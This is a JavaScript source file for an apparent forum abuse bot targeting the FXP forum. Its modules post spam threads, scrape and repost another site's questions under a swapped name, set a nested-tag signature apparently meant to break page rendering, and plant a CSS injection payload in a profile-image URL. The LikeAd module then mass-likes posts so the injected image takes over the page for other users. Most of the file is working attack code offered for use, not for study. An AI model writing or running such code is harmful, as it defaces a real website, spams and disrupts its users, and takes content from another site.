// modules SHIT CODE IK

const assert = require('assert');
const axios = require('axios');
const { Fxp, FxpController } = require('./dumble');
const { appendFileSync } = require('fs');

const between = (min, max) => {
	return Math.floor(
	    Math.random() * (max - min + 1) + min
	)
}

class BaseModule {
	constructor(client) {
		this.client = client;

		if (this.constructor === BaseModule) {
			throw new Error('BaseModule cannot be instantiated');
		}
	}

	async start() {
		throw new Error('BaseModule.start is not implementated');
	}
};

class ImageSpam extends BaseModule {
	constructor(client, data) {
		super(client);

		assert(data.forumId, 'forumId expected!');
		this.forumId = data.forumId;

		assert(data.titles, 'titles expected!');
		this.titles = data.titles;
	}

	async start() {
		const { title, description, image } = this.titles[~~(Math.random() * this.titles.length)];
		await this.client.changeImage(image);
		await this.client.createThread(this.forumId, title, `${description}<br>[img]${image}[/img]`);
	}
};


// NOT FOR USE RN
class Kibool extends BaseModule {
	constructor(client, data) { 
		super(client);

		assert(data.forumId, 'forum id expected!');
		this.forumId = data.forumId;
	}

	async generate(page) {
		//const page = between(1, 100);
		const url = `https://stips.co.il/api?name=objectlist&api_params={"method":"ask.new","safe_filter":false,"page":${page}}`;

		const result = await axios.get(url).then((resp) => resp.data.data); // no need

		const results = [ ];
		for (let i = 0; i < result.length; ++i) {
			const question = result[i];
			let { q, text_content } = question.data;
			q = q.replace('סטיפס', 'כספ');
			text_content = !text_content?.length ? ':nono:' : text_content.replace('סטיפס', 'כספ');
			results.push({ question: q, content: text_content });
		}

		return results;
	}

	async start() {
		const { question, content } = await this.generate();
		await this.client.createThread(this.forumId, question, content);
	}
};

// function toBinary(string) {
//   const codeUnits = new Uint16Array(string.length);
//   for (let i = 0; i < codeUnits.length; i++) {
//     codeUnits[i] = string.charCodeAt(i);
//   }
//   return btoa(String.fromCharCode(...new Uint8Array(codeUnits.buffer)));
// }

// (async() => {
// const test = new Kibool(null, { forumId: 69420 });
// for (let i = 0; i < 50; ++i) {
// 	const res = await test.generate(i);
	
// 	for (const { question, content } of res) {
// 		const xd = `${toBinary(question)}:${toBinary(content)}`;
// 		appendFileSync('lol.txt', xd + '\n');
// 	}

// 	console.log('done', i);
// }
// })();

class SignatureCrash extends BaseModule {
	constructor(client) {
		super(client);
	}

	async start() {
		await this.client.changeSignature('[CODE][CODE][CODE][CODE][CODE][CODE][CODE][CODE][CODE][CODE]‎\u200E[/CODE][/CODE][/CODE][/CODE][/CODE][/CODE][/CODE][/CODE][/CODE][/CODE]');
	}
};

class LikeAd extends BaseModule {
	constructor(client, data) {
		super(client);

		this.promises = [ ];

		assert(data.images, 'images expected!');
		this.images = data.images;

		assert(data.postIds, 'postIds expected!');
		this.postIds = data.postIds;
	}

	enqueueLike(pid) {
		this.promises.push(this.client.addLike(pid));
	}

	async start() {
		const image = this.images[~~(Math.random() * this.images.length)];
		const url = `https://profile.fcdn.co.il/epicgamer.jpg);background:url(${image});background-image:url(${image});background-size:100%;width:100vw;height:100vh;background-color:red;border-radius:0px;margin:-200px;padding:100px;margin-right:5000px;z-index:999;background:url(${image});background:url(${image});background-image:url(${image});background:url(${image});background-image:url(${image});background-attachment:fixed;overflow:hidden;top:0;left:0;ilovefxp;#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////images2/0__0643168d3a6f56.jpg`;
		await this.client.changeImage(url);

		this.postIds.forEach((postId) => {
			this.enqueueLike(postId);
		});
		await Promise.all(this.promises);
		await this.client.changeImage(null, true);
	}
};

module.exports = { ImageSpam, /*Kibool,*/ SignatureCrash, LikeAd };
